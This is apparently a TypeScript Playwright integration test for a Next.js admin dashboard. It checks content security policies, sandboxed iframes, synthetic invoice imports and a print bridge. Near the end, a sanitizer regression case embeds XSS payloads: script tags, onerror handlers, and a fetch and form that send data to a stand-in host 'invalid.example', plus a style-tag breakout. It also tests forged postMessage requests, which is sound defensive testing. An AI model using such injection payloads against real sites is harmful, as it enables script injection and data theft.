/**
 * Actual installed Next.js build/start, real next.config headers and real TOP
 * adapters. No production server, credentials, database, or real invoice data.
 * Run: KTS_STANDALONE_HTML_FIXTURE=/path/to/author.html node --import tsx tests/top-dashboard-next-runtime.browser.integration.ts
 * The author file is intentionally not checked in. Its entire kts-stock payload
 * is replaced before any copy is written or served, including on localhost.
 */
import assert from 'node:assert/strict';
import { spawn, type ChildProcess } from 'node:child_process';
import { mkdir, mkdtemp, readFile, symlink, writeFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { createServer } from 'node:net';
import { homedir, tmpdir } from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { build } from 'esbuild';
import * as XLSX from 'xlsx';
import {
  buildTopDashboardContentSecurityPolicy, buildTopDashboardFrameSecurityPolicy,
  createTopDashboardFrameBridgeScript, detectTopDashboardDataContract, injectTopDashboardDataAdapter,
} from '../src/shared/lib/topDashboardContentSecurity';

const require = createRequire(import.meta.url);
const project = path.resolve(import.meta.dirname, '..');
const framePath = '/api/admin/top-dashboard/blocks/7/versions/51/frame';
const contentPath = '/api/admin/top-dashboard/blocks/7/versions/51/content';
const outerPath = '/admin/top/7';
const fixturePath = process.env.KTS_STANDALONE_HTML_FIXTURE;
if (!fixturePath) throw new Error('Set KTS_STANDALONE_HTML_FIXTURE to the locally supplied author HTML. The fixture is never uploaded.');

type Invoice = { id: number; no: string; date: string; curDet: string; totalDue: number; manualCalc?: boolean;
  lines: Array<{ name: string; qty: number; gross: number }> };
declare const S: { invs: Invoice[] };
declare function calc(invoice: Invoice): { A: number; N: number; C: number; P: number; NP: number; margin: number | null };
type PrintProof = { beforePrint: number; nativeCalls: number; text: string; scripts: number; sandbox: string; csp: string; requests: number; html: string; unsafeNodes: number; eventAttributes: number };

async function realHeaderRules() {
  // Evaluate the actual config, not a hand-maintained copy of its policies.
  // Only headers() is reused: no real rewrites, environment, DB or app routes.
  const compiled = await build({ entryPoints: [path.join(project, 'next.config.ts')],
    absWorkingDir: project, bundle: true, write: false, platform: 'node', format: 'cjs', packages: 'external' });
  const configModule = { exports: {} as { default: { headers(): Promise<unknown> } } };
  new Function('module', 'exports', 'require', '__dirname', '__filename', compiled.outputFiles[0].text)(
    configModule, configModule.exports, require, project, path.join(project, 'next.config.ts'));
  return configModule.exports.default.headers();
}

async function syntheticPdf() {
  const PDFDocument = require('pdfkit');
  const doc = new PDFDocument({ size: 'A4', margin: 30, info: { Title: 'Synthetic runtime invoice' } });
  const chunks: Buffer[] = [];
  const complete = new Promise<Buffer>((resolve, reject) => {
    doc.on('data', (chunk: Buffer) => chunks.push(chunk));
    doc.on('end', () => resolve(Buffer.concat(chunks))); doc.on('error', reject);
  });
  doc.font(process.env.KTS_TEST_CYRILLIC_FONT ?? '/System/Library/Fonts/Supplemental/Arial.ttf').fontSize(10);
  doc.text('Счет № SYNTHETIC-PDF от 21.10.2026', 30, 30);
  doc.text('Валюта RUB', 30, 52);
  const xs = [30, 70, 300, 390, 460];
  ['№', 'Наименование', 'Количество', 'Цена', 'Сумма'].forEach((text, index) => doc.text(text, xs[index], 80, { lineBreak: false }));
  ['1', 'Synthetic fitting', '3', '25', '75'].forEach((text, index) => doc.text(text, xs[index], 105, { lineBreak: false }));
  doc.text('Итого к оплате', 30, 130, { lineBreak: false }); doc.text('75', 460, 130, { lineBreak: false });
  doc.end(); return complete;
}

function syntheticWorkbook() {
  const book = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(book, XLSX.utils.aoa_to_sheet([
    ['Счет № SYNTHETIC-XLSX от 21.10.2026'], ['Валюта RUB'],
    ['№', 'Наименование', 'Количество', 'Ед.', 'Цена', 'Сумма'],
    [1, 'Synthetic valve', 2, 'шт', 20, 40], ['Итого к оплате', null, null, null, null, 40],
  ]), 'Invoice');
  return XLSX.write(book, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
}

async function freePort() {
  const socket = createServer();
  await new Promise<void>((resolve, reject) => { socket.once('error', reject); socket.listen(0, '127.0.0.1', resolve); });
  const address = socket.address(); assert.ok(address && typeof address === 'object');
  await new Promise<void>(resolve => socket.close(() => resolve()));
  return address.port;
}

async function stop(child: ChildProcess) {
  if (child.exitCode !== null) return;
  child.kill('SIGTERM');
  await new Promise<void>(resolve => {
    const deadline = setTimeout(() => { child.kill('SIGKILL'); resolve(); }, 5000);
    child.once('exit', () => { clearTimeout(deadline); resolve(); });
  });
}

async function main() {
  const original = await readFile(fixturePath!, 'utf8');
  const stockPattern = /^([\t ]*<script\b(?=[^>]*\bid=["']kts-stock["'])[^>]*>)[\s\S]*?(<\/script\s*>)/gim;
  assert.equal([...original.matchAll(stockPattern)].length, 1, 'exactly one known business payload is required');
  const emptyBusinessData = { mgr: true, settings: { vat: 20, inputVat: true }, stockBase: null };
  const sanitized = original.replace(stockPattern, (_match, open, close) => open + JSON.stringify(emptyBusinessData) + close);
  assert.ok(sanitized.length < original.length / 2, 'refuse to serve a fixture that was not stripped of its embedded business data');
  assert.equal(detectTopDashboardDataContract(sanitized).profile, 'standalone');
  const adapted = injectTopDashboardDataAdapter(sanitized, { readOnly: true, localInvoiceMode: true });
  const contentPolicy = buildTopDashboardContentSecurityPolicy(adapted, { allowBlobModules: true });
  const bridge = createTopDashboardFrameBridgeScript(7, 51, false, { preview: false, auditEnabled: false });
  const framePolicy = buildTopDashboardFrameSecurityPolicy(bridge);
  const frameHtml = `<!doctype html><html lang="ru"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body,iframe{width:100%;height:100%;margin:0;border:0}body{position:relative;overflow:hidden}</style></head><body><iframe id="dashboard-frame" title="HTML-дашборд" sandbox="allow-scripts allow-popups" src="${contentPath}"></iframe><div id="data-notice" hidden></div><script>${bridge}</script></body></html>`;
  const directory = await mkdtemp(path.join(tmpdir(), 'kts-top-next-runtime-'));
  const app = path.join(directory, 'app');
  const headers = await realHeaderRules();
  await mkdir(app, { recursive: true });
  await symlink(path.join(project, 'node_modules'), path.join(directory, 'node_modules'), 'dir');
  await writeFile(path.join(directory, 'package.json'), JSON.stringify({ name: 'kts-synthetic-next-runtime', private: true,
    dependencies: { next: require('next/package.json').version, react: require('react/package.json').version, 'react-dom': require('react-dom/package.json').version } }));
  await writeFile(path.join(directory, 'next.config.mjs'), `export default { poweredByHeader: false, experimental: { cpus: 1 }, headers: async () => ${JSON.stringify(headers)} };`);
  await writeFile(path.join(app, 'layout.js'), 'export default function Layout({children}) { return <html><body style={{margin:0}}>{children}</body></html>; }');
  await writeFile(path.join(app, 'page.js'), 'export default function Page() { return <main>Synthetic runtime only</main>; }');
  await mkdir(path.join(app, outerPath), { recursive: true });
  // Same outer iframe capabilities as the actual viewer; author remains opaque.
  await writeFile(path.join(app, outerPath, 'page.js'), `export default function Page() { return <iframe id="outer-dashboard" title="Synthetic protected report" src="${framePath}" sandbox="allow-scripts allow-same-origin allow-popups allow-modals" style={{width:'100%',height:'100vh',border:0}} />; }`);
  for (const [route, html, csp] of [[framePath, frameHtml, framePolicy], [contentPath, adapted, contentPolicy]]) {
    const filename = route === framePath ? 'frame.html' : 'content.html';
    await writeFile(path.join(directory, filename), html);
    await mkdir(path.join(app, route), { recursive: true });
    await writeFile(path.join(app, route, 'route.js'), `import {readFile} from 'node:fs/promises'; export const dynamic='force-dynamic'; export async function GET(){ return new Response(await readFile(${JSON.stringify(path.join(directory, filename))},'utf8'),{headers:${JSON.stringify({ 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': csp, 'Cache-Control': 'private, no-store', 'X-Frame-Options': 'SAMEORIGIN' })}}); }`);
  }
  const env: NodeJS.ProcessEnv = { PATH: process.env.PATH, HOME: homedir(), TMPDIR: tmpdir(), NEXT_TELEMETRY_DISABLED: '1', NODE_ENV: 'production' };
  const cli = require.resolve('next/dist/bin/next');
  let log = '';
  const launch = (args: string[]) => {
    const child = spawn(process.execPath, [cli, ...args], { cwd: directory, env, stdio: ['ignore', 'pipe', 'pipe'] });
    child.stdout?.on('data', chunk => { log += String(chunk); }); child.stderr?.on('data', chunk => { log += String(chunk); });
    return child;
  };
  console.log(`Next runtime fixtures and screenshots: ${directory}`);
  const buildProcess = launch(['build', '--webpack']);
  const exit = await new Promise<number | null>((resolve, reject) => { buildProcess.once('error', reject); buildProcess.once('exit', resolve); });
  await writeFile(path.join(directory, 'next-runtime.log'), log);
  assert.equal(exit, 0, `synthetic Next production build failed; see ${directory}/next-runtime.log`);
  const port = await freePort(); const origin = `http://127.0.0.1:${port}`;
  const server = launch(['start', '--hostname', '127.0.0.1', '--port', String(port)]);
  try {
    const deadline = Date.now() + 30_000;
    while (true) {
      try { if ((await fetch(origin, { signal: AbortSignal.timeout(2000) })).ok) break; } catch { /* Startup only. */ }
      assert.ok(Date.now() < deadline && server.exitCode === null, 'Next server did not become ready');
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    const contentResponse = await fetch(origin + contentPath);
    assert.equal(contentResponse.status, 200);
    assert.equal(contentResponse.headers.get('content-security-policy'), contentPolicy, 'Next must not replace the route CSP with the global site CSP');
    const frameResponse = await fetch(origin + framePath);
    assert.equal(frameResponse.headers.get('content-security-policy'), framePolicy, 'frame policy is also generated per response');
    const outerResponse = await fetch(origin + outerPath);
    assert.match(outerResponse.headers.get('content-security-policy') ?? '', /default-src 'self'/, 'regular pages retain global site policy');
    const runtime = process.env.PLAYWRIGHT_MODULE_PATH ?? path.join(homedir(), '.cache/codex-runtimes/codex-primary-runtime/dependencies/node/node_modules/playwright');
    const playwright = await import(pathToFileURL(path.join(runtime, 'index.mjs')).href);
    const pdf = await syntheticPdf(); const xlsx = syntheticWorkbook();
    for (const engine of ['chromium', 'webkit']) {
      const browser = await playwright[engine].launch({ headless: true });
      try {
        const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
        const forbiddenRequests: string[] = []; const errors: string[] = [];
        await context.route('**/*', (route: { request(): { url(): string; method(): string }; continue(): Promise<void>; abort(): Promise<void> }) => {
          const request = route.request(); const url = new URL(request.url());
          if (url.protocol === 'blob:' || url.protocol === 'data:') return route.continue();
          if (url.origin !== origin || request.method() !== 'GET' || (url.pathname.startsWith('/api/') && ![framePath, contentPath].includes(url.pathname))) {
            forbiddenRequests.push(`${request.method()} ${url.origin === origin ? url.pathname : url.origin}`);
            return route.abort();
          }
          return route.continue();
        });
        const page = await context.newPage(); page.on('pageerror', (error: Error) => errors.push(error.message));
        await page.goto(origin + outerPath);
        const outer = page.frameLocator('#outer-dashboard');
        const report = outer.frameLocator('#dashboard-frame');
        await report.locator('#fInv').waitFor({ state: 'attached' });
        const author = page.frames().find((frame: { url(): string }) => frame.url() === origin + contentPath); assert.ok(author);
        const trusted = page.frames().find((frame: { url(): string }) => frame.url() === origin + framePath); assert.ok(trusted);
        assert.equal(await author.evaluate(() => { try { return Boolean(parent.document.body); } catch { return false; } }), false);
        assert.equal(await report.locator('#fInv').isDisabled(), false);
        await report.locator('#fInv').setInputFiles({ name: 'synthetic.xlsx', mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', buffer: xlsx });
        await author.waitForFunction(() => typeof S !== 'undefined' && S.invs.some(invoice => invoice.no === 'SYNTHETIC-XLSX'));
        assert.deepEqual(await author.evaluate(() => {
          const invoice = S.invs.find(item => item.no === 'SYNTHETIC-XLSX')!;
          return { no: invoice.no, currency: invoice.curDet, amount: invoice.totalDue, quantity: invoice.lines[0].qty, revenue: calc(invoice).A };
        }), { no: 'SYNTHETIC-XLSX', currency: 'RUB', amount: 40, quantity: 2, revenue: 40 });
        await report.locator('#fInv').setInputFiles({ name: 'synthetic.pdf', mimeType: 'application/pdf', buffer: pdf });
        await author.waitForFunction(() => S.invs.some(invoice => invoice.no === 'SYNTHETIC-PDF'), null, { timeout: 30_000 });
        assert.deepEqual(await author.evaluate(() => {
          const invoice = S.invs.find(item => item.no === 'SYNTHETIC-PDF')!;
          return { no: invoice.no, currency: invoice.curDet, amount: invoice.totalDue, quantity: invoice.lines[0].qty, name: invoice.lines[0].name, revenue: calc(invoice).A };
        }), { no: 'SYNTHETIC-PDF', currency: 'RUB', amount: 75, quantity: 3, name: 'Synthetic fitting', revenue: 75 });

        // Actual author UI, not a synthetic call to its calculation function.
        await report.locator('.mitem[data-view="manual"]').click();
        await report.locator('#bNewManual').click();
        // The author schedules modal focus after 30 ms. Do not close its modal
        // before its own opening transition has completed.
        await author.waitForFunction(() => document.activeElement?.id === 'addQ');
        await report.locator('#addFree').click();
        for (const [field, value] of [['name', 'Synthetic manual product'], ['qty', '2'], ['mpriceRub', '120'], ['mcostVat', '60']]) {
          await report.locator(`[data-ml="${field}"]`).fill(value);
          await report.locator(`[data-ml="${field}"]`).press('Tab');
        }
        assert.deepEqual(await author.evaluate(() => {
          const invoice = S.invs.find(item => item.manualCalc)!; const totals = calc(invoice);
          return { quantity: invoice.lines[0].qty, revenue: totals.A, netRevenue: totals.N, cost: totals.C, margin: totals.margin };
        }), { quantity: 2, revenue: 240, netRevenue: 200, cost: 100, margin: 50 });
        await page.screenshot({ path: path.join(directory, `${engine}-manual-calculation.png`) });

        // Observe the native print lifecycle in the trusted, scriptless child.
        // No print() stub: this catches missing allow-modals and wrong CSP.
        await trusted.evaluate(() => {
          const target = window as unknown as { printProof: PrintProof };
          target.printProof = { beforePrint: 0, nativeCalls: 0, text: '', scripts: -1, sandbox: '', csp: '', requests: 0, html: '', unsafeNodes: -1, eventAttributes: -1 };
          new MutationObserver(() => {
            const frame = document.querySelector<HTMLIFrameElement>('#dashboard-print-frame');
            if (!frame || frame.dataset.observed) return;
            frame.dataset.observed = 'yes'; target.printProof.requests += 1;
            frame.addEventListener('load', () => {
              const printWindow = frame.contentWindow!; const doc = frame.contentDocument!;
              target.printProof = { beforePrint: target.printProof.beforePrint, nativeCalls: target.printProof.nativeCalls, text: doc.body.textContent ?? '',
                scripts: doc.querySelectorAll('script').length, sandbox: frame.getAttribute('sandbox') ?? '',
                csp: doc.querySelector<HTMLMetaElement>('meta[http-equiv="Content-Security-Policy"]')?.content ?? '', requests: target.printProof.requests,
                html: doc.documentElement.outerHTML,
                unsafeNodes: doc.querySelectorAll('script,iframe,form,object,embed,link,base,meta[http-equiv="refresh"]').length,
                eventAttributes: Array.from(doc.querySelectorAll('*')).filter(node => node.getAttributeNames().some(name => /^on/i.test(name))).length };
              printWindow.addEventListener('beforeprint', () => { target.printProof.beforePrint += 1; });
              // Transparent observation, not a print stub. Headless WebKit's
              // native print is a no-op (also on an ordinary unsandboxed page),
              // so only Chromium can prove a native beforeprint event here.
              printWindow.print = new Proxy(printWindow.print, { apply(nativePrint, thisArg, argumentsList) {
                target.printProof.nativeCalls += 1;
                return Reflect.apply(nativePrint, thisArg, argumentsList);
              } });
            });
          }).observe(document.body, { childList: true });
        });
        await report.locator('#bPrint').click();
        await trusted.waitForFunction(() => (window as unknown as { printProof: PrintProof }).printProof.nativeCalls > 0, null, { timeout: 10_000 });
        const proof: PrintProof = await trusted.evaluate(() => (window as unknown as { printProof: PrintProof }).printProof);
        if (engine === 'chromium') assert.ok(proof.beforePrint > 0, 'native Chromium print lifecycle must start');
        assert.match(proof.text, /Лист согласования рентабельности/);
        assert.match(proof.text, /Synthetic manual product/);
        assert.equal(proof.scripts, 0); assert.equal(proof.requests, 1);
        assert.equal(proof.sandbox, 'allow-same-origin allow-modals'); assert.match(proof.csp, /script-src 'none'/);
        assert.match(proof.csp, /connect-src 'none'/);
        // Render the exact inert document captured at native beforeprint for
        // visual QA; its CSS must actually expose the author's print sheet.
        const printPage = await context.newPage();
        await printPage.route(`${origin}/qa-print`, (route: { fulfill(options: unknown): Promise<void> }) => route.fulfill({
          status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': proof.csp },
          body: Buffer.from('<!doctype html>' + proof.html.replace('<head>', '<head><meta charset="utf-8">'), 'utf8'),
        }));
        await printPage.emulateMedia({ media: 'print' });
        await printPage.goto(`${origin}/qa-print`);
        assert.match(await printPage.locator('#print').textContent(), /Лист согласования рентабельности/);
        assert.equal(await printPage.locator('#print').evaluate((element: Element) => getComputedStyle(element).display), 'block');
        await printPage.locator('#print .ps').waitFor({ state: 'visible' });
        await printPage.screenshot({ path: path.join(directory, `${engine}-print-sheet.png`), fullPage: true });
        await printPage.close();
        await page.bringToFront(); // WebKit suspends timers in background pages.
        assert.equal(await outer.locator('#dashboard-frame').getAttribute('sandbox'), 'allow-scripts allow-popups', 'author capabilities stay opaque and without modals');
        if (engine === 'webkit') {
          // Scriptless WebKit also suppresses child afterprint listeners. A
          // second real click must replace the retained frame, never lock the
          // author for ten minutes or let an old ACK clear its new print sheet.
          await page.waitForTimeout(1100);
          await report.locator('#bPrint').click();
          await trusted.waitForFunction(() => (window as unknown as { printProof: PrintProof }).printProof.nativeCalls === 2);
          assert.match(await report.locator('#print').textContent(), /Synthetic manual product/);
        } else {
          await outer.locator('#dashboard-print-frame').waitFor({ state: 'detached' });
        }
        const expectedPrints = engine === 'webkit' ? 2 : 1;

        const forgedPrint = { marker: 'kts-top-dashboard-print-v1', type: 'print-request', requestId: 'synthetic-forged',
          html: '<p>Must not print</p>', styles: [], title: 'Untrusted request' };
        await page.evaluate((payload: typeof forgedPrint) => {
          document.querySelector<HTMLIFrameElement>('#outer-dashboard')!.contentWindow!.postMessage(payload, location.origin);
        }, forgedPrint);
        await trusted.evaluate((payload: typeof forgedPrint) => {
          window.dispatchEvent(new MessageEvent('message', { data: payload, origin: location.origin,
            source: document.querySelector<HTMLIFrameElement>('#dashboard-frame')!.contentWindow }));
        }, forgedPrint);
        await page.waitForTimeout(200);
        assert.equal(await trusted.evaluate(() => (window as unknown as { printProof: PrintProof }).printProof.requests), expectedPrints,
          'wrong source and non-opaque origin cannot create a print frame');

        const maliciousPrint = { marker: 'kts-top-dashboard-print-v1', type: 'print-request', requestId: 'synthetic-malicious',
          html: '<div id="safe-print">Sanitized synthetic print</div><script>fetch("https://invalid.example/leak")</script>'
            + '<img src="https://invalid.example/image" onerror="alert(1)"><iframe src="https://invalid.example/frame"></iframe>'
            + '<form action="https://invalid.example/form"><input name="secret" value="synthetic"></form>'
            + '<meta http-equiv="refresh" content="0;url=https://invalid.example/nav"><a href="javascript:alert(1)" onclick="alert(1)">unsafe link</a>',
          styles: ['#safe-print{color:navy}/* </style><meta http-equiv="refresh" content="0;url=https://invalid.example/css"> */'],
          title: 'Synthetic sanitizer regression' };
        await author.evaluate((payload: typeof maliciousPrint) => {
          const button = document.createElement('button'); button.id = 'runtime-malicious-print'; button.textContent = 'Synthetic security print';
          button.addEventListener('click', () => window.parent.postMessage(payload, '*')); document.body.prepend(button);
        }, maliciousPrint);
        await page.waitForTimeout(1100); // Respect the real print double-click guard.
        await report.locator('#runtime-malicious-print').click();
        await trusted.waitForFunction((count: number) => (window as unknown as { printProof: PrintProof }).printProof.nativeCalls === count,
          expectedPrints + 1);
        const sanitizedProof: PrintProof = await trusted.evaluate(() => (window as unknown as { printProof: PrintProof }).printProof);
        assert.match(sanitizedProof.text, /Sanitized synthetic print/);
        assert.equal(sanitizedProof.unsafeNodes, 0); assert.equal(sanitizedProof.eventAttributes, 0);
        assert.doesNotMatch(sanitizedProof.html, /src="https:|href="javascript:/);
        if (engine === 'chromium') await outer.locator('#dashboard-print-frame').waitFor({ state: 'detached' });
        // Leave the transient gesture window before posting. evaluate() itself
        // can grant automation activation, so send from a delayed page timer.
        await author.evaluate((payload: typeof forgedPrint) => {
          window.setTimeout(() => window.parent.postMessage(payload, '*'), 5500);
        }, { ...forgedPrint, requestId: 'synthetic-no-gesture' });
        await page.waitForTimeout(6000);
        assert.equal(await trusted.evaluate(() => (window as unknown as { printProof: PrintProof }).printProof.requests), expectedPrints + 1,
          'a gestureless author request cannot open print');
        assert.match(await outer.locator('#data-notice').textContent(), /нажмите кнопку печати/);
        assert.deepEqual(forbiddenRequests, [], 'no external fetches, shared uploads, API reads or fabricated audit events');
        assert.deepEqual(errors, []);
        await writeFile(path.join(directory, `${engine}-print-proof.json`), JSON.stringify(proof, null, 2));
        console.log(JSON.stringify({ engine, next: require('next/package.json').version, result: 'pass', layers: 2,
          imports: ['XLSX', 'PDF'], manualCalculation: true, nativePrintCalls: proof.nativeCalls,
          nativeBeforePrint: proof.beforePrint, webkitDialogNotImplemented: engine === 'webkit', externalRequests: forbiddenRequests.length }));
        await context.close();
      } finally { await browser.close(); }
    }
  } finally {
    await stop(server); await writeFile(path.join(directory, 'next-runtime.log'), log);
  }
}

main().catch(error => { console.error(error); process.exitCode = 1; });
